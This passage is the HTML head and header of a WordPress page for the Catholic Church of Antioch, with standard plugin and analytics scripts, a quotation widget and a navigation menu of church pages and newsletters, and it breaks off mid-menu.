<link rel='stylesheet' id='ada-relief-css' href='https://www.churchofantioch.org/wp-content/plugins/ada-relief/css/ada-relief.css?ver=1.2.6' type='text/css' media='all' />
<link rel='stylesheet' id='cleantalk-public-css-css' href='https://www.churchofantioch.org/wp-content/plugins/cleantalk-spam-protect/css/cleantalk-public.min.css?ver=6.72_1770322201' type='text/css' media='all' />
<link rel='stylesheet' id='cleantalk-email-decoder-css-css' href='https://www.churchofantioch.org/wp-content/plugins/cleantalk-spam-protect/css/cleantalk-email-decoder.min.css?ver=6.72_1770322201' type='text/css' media='all' />
<link rel='stylesheet' id='quotescollection-css' href='https://www.churchofantioch.org/wp-content/plugins/quotes-collection/css/quotes-collection.css?ver=2.5.2' type='text/css' media='all' />
<link rel='stylesheet' id='fusion-dynamic-css-css' href='https://www.churchofantioch.org/wp-content/uploads/fusion-styles/c0a1f61a6aaf8b943502efa7a82161bb.min.css?ver=3.14.2' type='text/css' media='all' />
<script type="text/javascript" src="https://www.churchofantioch.org/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend-gtag.min.js?ver=10.0.1" id="monsterinsights-frontend-script-js" async="async" data-wp-strategy="async"></script>
<script data-cfasync="false" data-wpfc-render="false" type="text/javascript" id='monsterinsights-frontend-script-js-extra'>/* <![CDATA[ */
var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/www.churchofantioch.org","hash_tracking":"false","v4_id":"G-HKGCHXVQ1V"};/* ]]> */
</script>
<script type="text/javascript" src="https://www.churchofantioch.org/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://www.churchofantioch.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://www.churchofantioch.org/wp-content/plugins/cleantalk-spam-protect/js/apbct-public-bundle_gathering.min.js?ver=6.72_1770322201" id="apbct-public-bundle_gathering.min-js-js"></script>
<script type="text/javascript" id="quotescollection-js-extra">
/* <![CDATA[ */
var quotescollectionAjax = {"ajaxUrl":"https://www.churchofantioch.org/wp-admin/admin-ajax.php","nonce":"433adffd57","nextQuote":"Next quote \u00bb","loading":"Loading...","error":"Error getting quote","autoRefreshMax":"20","autoRefreshCount":"0"};
//# sourceURL=quotescollection-js-extra
/* ]]> */
</script>
<script type="text/javascript" src="https://www.churchofantioch.org/wp-content/plugins/quotes-collection/js/quotes-collection.js?ver=2.5.2" id="quotescollection-js"></script>
<link rel="https://api.w.org/" href="https://www.churchofantioch.org/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.churchofantioch.org/wp-json/wp/v2/pages/2430" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.churchofantioch.org/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.9.1" />
<link rel='shortlink' href='https://www.churchofantioch.org/?p=2430' />
<link rel="preload" href="https://www.churchofantioch.org/wp-content/themes/Avada/includes/lib/assets/fonts/icomoon/awb-icons.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="//www.churchofantioch.org/wp-content/themes/Avada/includes/lib/assets/fonts/fontawesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="//www.churchofantioch.org/wp-content/themes/Avada/includes/lib/assets/fonts/fontawesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="//www.churchofantioch.org/wp-content/themes/Avada/includes/lib/assets/fonts/fontawesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin><style type="text/css" id="css-fb-visibility">@media screen and (max-width: 640px){.fusion-no-small-visibility{display:none !important;}body .sm-text-align-center{text-align:center !important;}body .sm-text-align-left{text-align:left !important;}body .sm-text-align-right{text-align:right !important;}body .sm-text-align-justify{text-align:justify !important;}body .sm-flex-align-center{justify-content:center !important;}body .sm-flex-align-flex-start{justify-content:flex-start !important;}body .sm-flex-align-flex-end{justify-content:flex-end !important;}body .sm-mx-auto{margin-left:auto !important;margin-right:auto !important;}body .sm-ml-auto{margin-left:auto !important;}body .sm-mr-auto{margin-right:auto !important;}body .fusion-absolute-position-small{position:absolute;width:100%;}.awb-sticky.awb-sticky-small{ position: sticky; top: var(--awb-sticky-offset,0); }}@media screen and (min-width: 641px) and (max-width: 1024px){.fusion-no-medium-visibility{display:none !important;}body .md-text-align-center{text-align:center !important;}body .md-text-align-left{text-align:left !important;}body .md-text-align-right{text-align:right !important;}body .md-text-align-justify{text-align:justify !important;}body .md-flex-align-center{justify-content:center !important;}body .md-flex-align-flex-start{justify-content:flex-start !important;}body .md-flex-align-flex-end{justify-content:flex-end !important;}body .md-mx-auto{margin-left:auto !important;margin-right:auto !important;}body .md-ml-auto{margin-left:auto !important;}body .md-mr-auto{margin-right:auto !important;}body .fusion-absolute-position-medium{position:absolute;width:100%;}.awb-sticky.awb-sticky-medium{ position: sticky; top: var(--awb-sticky-offset,0); }}@media screen and (min-width: 1025px){.fusion-no-large-visibility{display:none !important;}body .lg-text-align-center{text-align:center !important;}body .lg-text-align-left{text-align:left !important;}body .lg-text-align-right{text-align:right !important;}body .lg-text-align-justify{text-align:justify !important;}body .lg-flex-align-center{justify-content:center !important;}body .lg-flex-align-flex-start{justify-content:flex-start !important;}body .lg-flex-align-flex-end{justify-content:flex-end !important;}body .lg-mx-auto{margin-left:auto !important;margin-right:auto !important;}body .lg-ml-auto{margin-left:auto !important;}body .lg-mr-auto{margin-right:auto !important;}body .fusion-absolute-position-large{position:absolute;width:100%;}.awb-sticky.awb-sticky-large{ position: sticky; top: var(--awb-sticky-offset,0); }}</style><meta name="generator" content="Powered by Slider Revolution 6.7.39 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
<script>function setREVStartSize(e){
			//window.requestAnimationFrame(function() {
				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
				try {
					var pw = document.getElementById(e.c).parentNode.offsetWidth,
						newh;
					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
					if(e.layout==="fullscreen" || e.l==="fullscreen")
						newh = Math.max(e.mh,window.RSIH);
					else{
						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
											
						var nl = new Array(e.rl.length),
							ix = 0,
							sl;
						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
						sl = nl[0];
						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
					}
					var el = document.getElementById(e.c);
					if (el!==null && el) el.style.height = newh+"px";
					el = document.getElementById(e.c+"_wrapper");
					if (el!==null && el) {
						el.style.height = newh+"px";
						el.style.display = "block";
					}
				} catch(e){
					console.log("Failure at Presize of Slider:" + e)
				}
			//});
		  };</script>
		<script type="text/javascript">
			var doc = document.documentElement;
			doc.setAttribute( 'data-useragent', navigator.userAgent );
		</script>
		<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-EMEV7HJLJS"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-EMEV7HJLJS');
</script>
	<link rel='stylesheet' id='rs-plugin-settings-css' href='//www.churchofantioch.org/wp-content/plugins/revslider/sr6/assets/css/rs6.css?ver=6.7.39' type='text/css' media='all' />
<style id='rs-plugin-settings-inline-css' type='text/css'>
#rs-demo-id {}
/*# sourceURL=rs-plugin-settings-inline-css */
</style>

</head>

<body class="wp-singular page-template-default page page-id-2430 wp-theme-Avada wp-child-theme-Avada-Child-Theme fusion-image-hovers fusion-pagination-sizing fusion-button_type-flat fusion-button_span-no fusion-button_gradient-linear avada-image-rollover-circle-yes avada-image-rollover-yes avada-image-rollover-direction-left fusion-body ltr fusion-sticky-header no-tablet-sticky-header no-mobile-sticky-header no-mobile-slidingbar no-mobile-totop avada-has-rev-slider-styles fusion-disable-outline fusion-sub-menu-fade mobile-logo-pos-left layout-wide-mode avada-has-boxed-modal-shadow- layout-scroll-offset-full avada-has-zero-margin-offset-top fusion-top-header menu-text-align-center mobile-menu-design-classic fusion-show-pagination-text fusion-header-layout-v3 avada-responsive avada-footer-fx-none avada-menu-highlight-style-bar fusion-search-form-clean fusion-main-menu-search-overlay fusion-avatar-circle avada-dropdown-styles avada-blog-layout-timeline avada-blog-archive-layout-timeline avada-header-shadow-no avada-menu-icon-position-left avada-has-megamenu-shadow avada-has-mobile-menu-search avada-has-main-nav-search-icon avada-has-breadcrumb-mobile-hidden avada-has-titlebar-hide avada-header-border-color-full-transparent avada-has-pagination-width_height avada-flyout-menu-direction-fade avada-ec-views-v1" data-awb-post-id="2430">
		<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<div id="boxed-wrapper">
		
		<div id="wrapper" class="fusion-wrapper">
			<div id="home" style="position:relative;top:-1px;"></div>
												<div class="fusion-tb-header"><div class="fusion-fullwidth fullwidth-box fusion-builder-row-1 fusion-flex-container nonhundred-percent-fullwidth non-hundred-percent-height-scrolling fusion-custom-z-index" style="--awb-border-radius-top-left:0px;--awb-border-radius-top-right:0px;--awb-border-radius-bottom-right:0px;--awb-border-radius-bottom-left:0px;--awb-z-index:9999;--awb-padding-top:5px;--awb-padding-bottom:0px;--awb-background-color:#000000;--awb-flex-wrap:wrap;" ><div class="fusion-builder-row fusion-row fusion-flex-align-items-center fusion-flex-justify-content-center fusion-flex-content-wrap" style="max-width:calc( 960px + 0px );margin-left: calc(-0px / 2 );margin-right: calc(-0px / 2 );"><div class="fusion-layout-column fusion_builder_column fusion-builder-column-0 fusion_builder_column_1_2 1_2 fusion-flex-column fusion-flex-align-self-center" style="--awb-bg-size:cover;--awb-width-large:50%;--awb-margin-top-large:0px;--awb-spacing-right-large:0px;--awb-margin-bottom-large:0px;--awb-spacing-left-large:0px;--awb-width-medium:50%;--awb-order-medium:0;--awb-spacing-right-medium:0px;--awb-spacing-left-medium:0px;--awb-width-small:100%;--awb-order-small:0;--awb-spacing-right-small:0px;--awb-spacing-left-small:0px;"><div class="fusion-column-wrapper fusion-column-has-shadow fusion-flex-justify-content-center fusion-content-layout-column"><div class="fusion-text fusion-text-1" style="--awb-text-transform:none;--awb-text-color:#ffffff;"><p>CONTACT US. For additional information, <span style="color: #ffffff;"><a style="color: #ffffff;" href="mailto:antioch1@swcp">antioch1@swcp.com</a></span></p>
</div></div></div><div class="fusion-layout-column fusion_builder_column fusion-builder-column-1 fusion_builder_column_1_2 1_2 fusion-flex-column fusion-flex-align-self-center" style="--awb-bg-size:cover;--awb-width-large:50%;--awb-margin-top-large:0px;--awb-spacing-right-large:0px;--awb-margin-bottom-large:0px;--awb-spacing-left-large:0px;--awb-width-medium:50%;--awb-order-medium:0;--awb-spacing-right-medium:0px;--awb-spacing-left-medium:0px;--awb-width-small:100%;--awb-order-small:0;--awb-spacing-right-small:0px;--awb-spacing-left-small:0px;"><div class="fusion-column-wrapper fusion-column-has-shadow fusion-flex-justify-content-center fusion-content-layout-column"></div></div></div></div><div class="fusion-fullwidth fullwidth-box fusion-builder-row-2 fusion-flex-container fusion-parallax-none nonhundred-percent-fullwidth non-hundred-percent-height-scrolling fusion-custom-z-index" style="--awb-border-sizes-bottom:4px;--awb-border-color:#972121;--awb-border-radius-top-left:0px;--awb-border-radius-top-right:0px;--awb-border-radius-bottom-right:0px;--awb-border-radius-bottom-left:0px;--awb-z-index:999;--awb-padding-top:20px;--awb-background-color:#161616;--awb-background-image:url(&quot;https://www.churchofantioch.org/wp-content/uploads/2022/01/header-5.jpg&quot;);--awb-background-size:cover;--awb-flex-wrap:wrap;" ><div class="fusion-builder-row fusion-row fusion-flex-align-items-center fusion-flex-justify-content-center fusion-flex-content-wrap" style="max-width:998.4px;margin-left: calc(-4% / 2 );margin-right: calc(-4% / 2 );"><div class="fusion-layout-column fusion_builder_column fusion-builder-column-2 fusion_builder_column_1_3 1_3 fusion-flex-column" style="--awb-bg-size:cover;--awb-width-large:33.333333333333%;--awb-margin-top-large:0px;--awb-spacing-right-large:5.76%;--awb-margin-bottom-large:20px;--awb-spacing-left-large:5.76%;--awb-width-medium:33.333333333333%;--awb-order-medium:0;--awb-spacing-right-medium:5.76%;--awb-spacing-left-medium:5.76%;--awb-width-small:100%;--awb-order-small:0;--awb-spacing-right-small:1.92%;--awb-spacing-left-small:1.92%;"><div class="fusion-column-wrapper fusion-column-has-shadow fusion-flex-justify-content-flex-start fusion-content-layout-column"><div class="fusion-image-element " style="--awb-caption-title-font-family:var(--h2_typography-font-family);--awb-caption-title-font-weight:var(--h2_typography-font-weight);--awb-caption-title-font-style:var(--h2_typography-font-style);--awb-caption-title-size:var(--h2_typography-font-size);--awb-caption-title-transform:var(--h2_typography-text-transform);--awb-caption-title-line-height:var(--h2_typography-line-height);--awb-caption-title-letter-spacing:var(--h2_typography-letter-spacing);"><span class=" fusion-imageframe imageframe-none imageframe-1 hover-type-none"><a class="fusion-no-lightbox" href="https://www.churchofantioch.org" target="_self"><img decoding="async" width="350" height="125" alt="Logo" src="https://www.churchofantioch.org/wp-content/uploads/2022/01/logo-3.png" class="img-responsive wp-image-2020" srcset="https://www.churchofantioch.org/wp-content/uploads/2022/01/logo-3-200x71.png 200w, https://www.churchofantioch.org/wp-content/uploads/2022/01/logo-3.png 350w" sizes="(max-width: 640px) 100vw, 350px" /></a></span></div></div></div><div class="fusion-layout-column fusion_builder_column fusion-builder-column-3 fusion_builder_column_1_5 1_5 fusion-flex-column" style="--awb-bg-size:cover;--awb-width-large:20%;--awb-margin-top-large:0px;--awb-spacing-right-large:9.6%;--awb-margin-bottom-large:20px;--awb-spacing-left-large:9.6%;--awb-width-medium:20%;--awb-order-medium:0;--awb-spacing-right-medium:9.6%;--awb-spacing-left-medium:9.6%;--awb-width-small:100%;--awb-order-small:0;--awb-spacing-right-small:1.92%;--awb-spacing-left-small:1.92%;"><div class="fusion-column-wrapper fusion-column-has-shadow fusion-flex-justify-content-flex-start fusion-content-layout-column"></div></div><div class="fusion-layout-column fusion_builder_column fusion-builder-column-4 fusion_builder_column_2_5 2_5 fusion-flex-column fusion-flex-align-self-center fusion-no-small-visibility" style="--awb-padding-right:10px;--awb-padding-left:10px;--awb-bg-color:rgba(0,0,0,0.6);--awb-bg-color-hover:rgba(0,0,0,0.6);--awb-bg-size:cover;--awb-width-large:40%;--awb-margin-top-large:0px;--awb-spacing-right-large:4.8%;--awb-margin-bottom-large:20px;--awb-spacing-left-large:4.8%;--awb-width-medium:40%;--awb-order-medium:0;--awb-spacing-right-medium:4.8%;--awb-spacing-left-medium:4.8%;--awb-width-small:100%;--awb-order-small:0;--awb-spacing-right-small:1.92%;--awb-spacing-left-small:1.92%;"><div class="fusion-column-wrapper fusion-column-has-shadow fusion-flex-justify-content-center fusion-content-layout-column"><div class="fusion-widget-area awb-widget-area-element fusion-widget-area-1 fusion-content-widget-area mywhite" style="--awb-title-color:var(--awb-color8);--awb-padding:0px 0px 0px 0px;"><section id="quotescollection-2" class="fusion-slidingbar-widget-column widget widget_quotescollection" style="border-style: solid;border-color:transparent;border-width:0px;"><div class="quotescollection-quote-wrapper" id="w_quotescollection_2"><p>&#8220;One of the disturbing factors in the current practice of average Christian living is the assumption that spirituality is an attitude attained, rather than an attitude maintained.&#8221;</p>
<div class="attribution">&mdash;&nbsp;<cite class="author">Patriarch Herman Adrian Spruit</cite></div></div><div style="clear:both;"></div></section><div class="fusion-additional-widget-content"></div></div></div></div><div class="fusion-layout-column fusion_builder_column fusion-builder-column-5 fusion_builder_column_1_1 1_1 fusion-flex-column" style="--awb-bg-color:#972121;--awb-bg-color-hover:#972121;--awb-bg-size:cover;--awb-width-large:100%;--awb-margin-top-large:0px;--awb-spacing-right-large:1.92%;--awb-margin-bottom-large:20px;--awb-spacing-left-large:1.92%;--awb-width-medium:100%;--awb-order-medium:0;--awb-spacing-right-medium:1.92%;--awb-spacing-left-medium:1.92%;--awb-width-small:100%;--awb-order-small:0;--awb-spacing-right-small:1.92%;--awb-spacing-left-small:1.92%;"><div class="fusion-column-wrapper fusion-column-has-shadow fusion-flex-justify-content-flex-start fusion-content-layout-column"><nav class="awb-menu awb-menu_row awb-menu_em-hover mobile-mode-collapse-to-button awb-menu_icons-left awb-menu_dc-yes mobile-trigger-fullwidth-off awb-menu_mobile-toggle awb-menu_indent-left mobile-size-full-absolute loading mega-menu-loading awb-menu_desktop awb-menu_dropdown awb-menu_expand-right awb-menu_transition-fade" style="--awb-font-size:14px;--awb-align-items:center;--awb-justify-content:center;--awb-items-padding-right:20px;--awb-color:#ffffff;--awb-active-color:#f0ffbc;--awb-submenu-color:#ffffff;--awb-submenu-bg:#000000;--awb-submenu-sep-color:#c4c4c4;--awb-submenu-space:20px;--awb-main-justify-content:flex-start;--awb-mobile-bg:#000000;--awb-mobile-color:#ffffff;--awb-mobile-justify:flex-start;--awb-mobile-caret-left:auto;--awb-mobile-caret-right:0;--awb-fusion-font-family-typography:&quot;Roboto&quot;;--awb-fusion-font-style-typography:normal;--awb-fusion-font-weight-typography:500;--awb-fusion-font-family-submenu-typography:inherit;--awb-fusion-font-style-submenu-typography:normal;--awb-fusion-font-weight-submenu-typography:400;--awb-fusion-font-family-mobile-typography:inherit;--awb-fusion-font-style-mobile-typography:normal;--awb-fusion-font-weight-mobile-typography:400;" aria-label="Main Navigation Categories" data-breakpoint="1024" data-count="0" data-transition-type="fade" data-transition-time="300" data-expand="right"><button type="button" class="awb-menu__m-toggle awb-menu__m-toggle_no-text" aria-expanded="false" aria-controls="menu-main-navigation-categories"><span class="awb-menu__m-toggle-inner"><span class="collapsed-nav-text"><span class="screen-reader-text">Toggle Navigation</span></span><span class="awb-menu__m-collapse-icon awb-menu__m-collapse-icon_no-text"><span class="awb-menu__m-collapse-icon-open awb-menu__m-collapse-icon-open_no-text fa-bars fas"></span><span class="awb-menu__m-collapse-icon-close awb-menu__m-collapse-icon-close_no-text fa-times fas"></span></span></span></button><ul id="menu-main-navigation-categories" class="fusion-menu awb-menu__main-ul awb-menu__main-ul_row"><li  id="menu-item-2086"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-2086 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="2086"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">HOME</span></a></li><li  id="menu-item-291"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-291 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="291"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/about-the-church/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">WHO WE ARE</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of WHO WE ARE" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_main"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_main"><li  id="menu-item-296"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-296 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/history/" class="awb-menu__sub-a"><span>History</span></a></li><li  id="menu-item-292"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-292 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/apostolic-succession/" class="awb-menu__sub-a"><span>Apostolic Succession</span></a></li><li  id="menu-item-293"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-293 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/board-of-advisors/" class="awb-menu__sub-a"><span>Administration</span></a></li><li  id="menu-item-298"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-298 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/priesthood/" class="awb-menu__sub-a"><span>Priesthood &#038; CCOA Principles</span></a></li><li  id="menu-item-2281"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2281 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/sophia-divinity-school/" class="awb-menu__sub-a"><span>Sophia Divinity School</span></a></li><li  id="menu-item-294"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-294 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/ccoa-chartered-ministries/" class="awb-menu__sub-a"><span>CCOA Chartered Ministries</span></a></li><li  id="menu-item-2863"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2863 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/spiritual-direction/" class="awb-menu__sub-a"><span>Spiritual Direction</span></a></li><li  id="menu-item-320"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-320 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/safe-church/" class="awb-menu__sub-a"><span>Safe Church</span></a></li><li  id="menu-item-848"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-848 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/additional-information/ccoa-policy-on-sexual-misconduct-2/" class="awb-menu__sub-a"><span>CCOA Policy on Sexual Misconduct</span></a></li><li  id="menu-item-1588"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1588 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/additional-information/ccoa-policy-on-anti-discrimination/" class="awb-menu__sub-a"><span>CCOA Policy on Anti-Discrimination</span></a></li><li  id="menu-item-1589"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1589 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/additional-information/ccoa-anti-bullying-policy/" class="awb-menu__sub-a"><span>CCOA Policy on Anti-Bullying</span></a></li><li  id="menu-item-1587"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1587 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/additional-information/ccoa-policy-on-anti-harassment/" class="awb-menu__sub-a"><span>CCOA Policy on Anti-Harassment</span></a></li><li  id="menu-item-295"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-295 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/creed-of-the-catholic-church-of-antioch/" class="awb-menu__sub-a"><span>Creed of the Catholic Church of Antioch</span></a></li><li  id="menu-item-297"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-297 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/mission-statement/" class="awb-menu__sub-a"><span>Mission Statement</span></a></li><li  id="menu-item-299"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-299 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/spiritual-principles/" class="awb-menu__sub-a"><span>Spiritual Principles</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of Spiritual Principles" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_sub"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_grand"><li  id="menu-item-2959"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2959 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/divine-feminine/" class="awb-menu__sub-a"><span>Divine Feminine</span></a></li></ul></li><li  id="menu-item-1944"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1944 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/book-of-order-canons-of-the-church/" class="awb-menu__sub-a"><span>Book of Order &ndash; Canons of the Church</span></a></li><li  id="menu-item-1024"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1024 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/additional-information/in-memoriam-2/" class="awb-menu__sub-a"><span>+IN MEMORIAM+</span></a></li></ul></li><li  id="menu-item-302"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-302 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="302"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/additional-information/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">ADDITIONAL INFO</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of ADDITIONAL INFO" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_main"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_main"><li  id="menu-item-1419"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1419 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/ccoa-worldwide/statement-on-the-ecumenical-councils/" class="awb-menu__sub-a"><span>Statement on the Ecumenical Councils</span></a></li><li  id="menu-item-1465"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1465 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/about-the-church/statement-on-the-bem-document/" class="awb-menu__sub-a"><span>Statement on the BEM Document</span></a></li><li  id="menu-item-304"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-304 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/additional-information/independent-catholicism/" class="awb-menu__sub-a"><span>Independent Catholicism</span></a></li><li  id="menu-item-982"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-982 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/additional-information/the-cross-of-antioch-2/" class="awb-menu__sub-a"><span>The Cross of Antioch</span></a></li></ul></li><li  id="menu-item-307"  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-307 awb-menu__li awb-menu__main-li awb-menu__main-li_regular"  data-item-id="307"><span class="awb-menu__main-background-default awb-menu__main-background-default_fade"></span><span class="awb-menu__main-background-active awb-menu__main-background-active_fade"></span><a  href="https://www.churchofantioch.org/newsletters/" class="awb-menu__main-a awb-menu__main-a_regular"><span class="menu-text">NEWSLETTERS</span><span class="awb-menu__open-nav-submenu-hover"></span></a><button type="button" aria-label="Open submenu of NEWSLETTERS" aria-expanded="false" class="awb-menu__open-nav-submenu_mobile awb-menu__open-nav-submenu_main"></button><ul class="awb-menu__sub-ul awb-menu__sub-ul_main"><li  id="menu-item-2928"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2928 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2025/06/2024FallNewsletter.pdf" class="awb-menu__sub-a"><span>The Voice Fall, 2024</span></a></li><li  id="menu-item-2580"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2580 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2023/12/The-Voice-Fall-2023.pdf" class="awb-menu__sub-a"><span>The Voice Fall 2023</span></a></li><li  id="menu-item-2410"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2410 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2023/04/2023SpringNewsletter.pdf" class="awb-menu__sub-a"><span>The Voice Spring 2023</span></a></li><li  id="menu-item-2373"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2373 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2022/12/2022FallNewsletter-final-3.pdf" class="awb-menu__sub-a"><span>The Voice Fall 2022</span></a></li><li  id="menu-item-2180"  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2180 awb-menu__li awb-menu__sub-li" ><a  href="https://www.churchofantioch.org/wp-content/uploads/2022/05/Spring2022Newsletter.pdf" class="awb-menu__sub-a"><span>The Voice Spring 